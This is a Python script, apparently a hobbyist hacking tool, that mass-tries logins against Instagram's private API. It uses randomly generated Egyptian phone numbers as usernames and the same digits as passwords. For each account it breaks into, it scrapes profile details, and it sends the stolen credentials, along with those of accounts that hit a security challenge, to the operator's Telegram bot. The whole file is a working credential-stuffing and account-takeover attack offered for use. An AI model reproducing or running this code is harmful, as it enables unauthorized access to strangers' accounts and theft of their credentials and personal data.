# = = = = = = = = = = = 
X = '\033[1;33m' #ازرق
import time
import pyfiglet
import sys
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/5000)
j('\033[1;31x⌯'*60)
hunter = pyfiglet.figlet_format("M O H A M E D")
print('')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/1000)
j(X+hunter)
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3/5000)
        
MSalah ="MSalah"

for i in range (999999) : 
      pwd = input ("PASSWORD : ")
      j = 9999999
      if ( pwd==MSalah ) : 
              print (" Welcoem To Script   ") 
              break    
def jalan(z):
 for e in z + '\n':
  sys.stdout.write(e)
  sys.stdout.flush()
  time.sleep(00000.05)
jalan('''\033[1;35m [~] TOOL BY [>>] Mohamed Salah ''')
from typing import Mapping


try:
    import random,requests,os,uuid,time,secrets
    from uuid import uuid4
except ModuleNotFoundError:
    os.system('pip install time')
    os.system('pip install uuid')
    os.system('pip install random')
    os.system('pip install requests')

BRed="\033[1;31m" # Red
BGreen="\033[1;32m" # Green
BYellow="\033[1;33m" # Yellow
BBlue="\033[1;34m" # Blue
BPurple="\033[1;35m" # Purple
BCyan="\033[1;36m" # Cyan
BWhite="\033[1;37m" # White
lo = '— —'
print(' ')
print(BGreen+lo*18)
print(' ')                               
myadmin = input("  "+BRed+"- Id ")
tele = input("  "+BRed+"- Token  ")
os.system('clear')
print(' ')
print(BGreen+lo*18)
print(' ')
def info(user2,pasw):
    global tele,myadmin,mess
    cookie = secrets.token_hex(8)*2
    headr = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"}
    url2 = f'https://www.instagram.com/{user2}/?__a=1'
    ree = requests.get(url2,headers=headr).json()
    name = str(ree['graphql']['user']['full_name'])
    id = str(ree['graphql']['user']['id'])
    followes = str(ree['graphql']['user']['edge_followed_by']['count'])
    following = str(ree['graphql']['user']['edge_follow']['count'])
    isp = str(ree['graphql']['user']['is_private'])
    ids = str(ree['graphql']['user']['id'])
    bio = str(ree['graphql']['user']['biography'])
    re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")   
    ree = re.json()
    datee = ree['data']
    ms = f"""
Welcom To script BY > > MOHAMED - SALAH
⌯ اليوزر : {user2}
⌯ الأسم  : {name}
⌯ الرمز : {pasw} 
⌯ عدد متابعين  : {followes}
⌯ يتابع : {following}
⌯ الحساب خاص : {isp}
⌯ أيدي الحساب  : {ids}
⌯ بايو الحساب : {bio}
⌯ تاريخ أنشاء الحساب : {datee}

اتعلم  يا طفل عمك ابو صلاح """
    requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text={ms}""")    
    print(BGreen+ms)

while True:
    chars = '0987654321'
    u = '121'
    u1 = str("". join(random.choice(chars)for i in range(7)))
    u2 = str("". join(random.choice(u)for i in range(1)))
    user = '+20'+u+u1
    pasw = '0'+u+u1
    url = 'https://i.instagram.com/api/v1/accounts/login/'          
    headers = {'User-Agent': 'User-Agent: Instagram 6.12.1 Android (22/5.1.1; 240dpi; 540x960; samsung; SM-G531H; grandprimeve3g; sc8830; fr_FR)',  'Accept':'*/*', 
         'Cookie':'missing', 
         'Accept-Encoding':'gzip', 
         'Accept-Language':'fr-FR, en-US', 
         'X-IG-Capabilities':'AQ==', 
         'X-IG-Connection-Type':'MOBILE(HSPA+)', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'}
    uid = str(uuid4())
    data = {
    	'uuid':uid,'password':pasw, 
         'username':user, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
    req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
    if 'logged_in_user' in req_login.text:
        user2 = req_login.json()['logged_in_user']['username']
        info(user2,pasw)
    elif '"message":"challenge_required","challenge"' in req_login.text:
        print("  "+BYellow+f"  ⌯ Secure Acc --> "+BWhite+" :"+BYellow+f" {user}:{pasw} ")
        requests.post(f"""https://api.telegram.org/bot{tele}/sendMessage?chat_id={myadmin}&text=
    افحص الحساب  
    ===============
    User : {user} 
    Pasw : {pasw} 
     ================
     CHANAL > > @Freeintrn""")
    else:
        print("  "+BRed+f"  ⌯ BaD --> "+BWhite+" :"+BRed+f" {user}:{pasw} ")
    
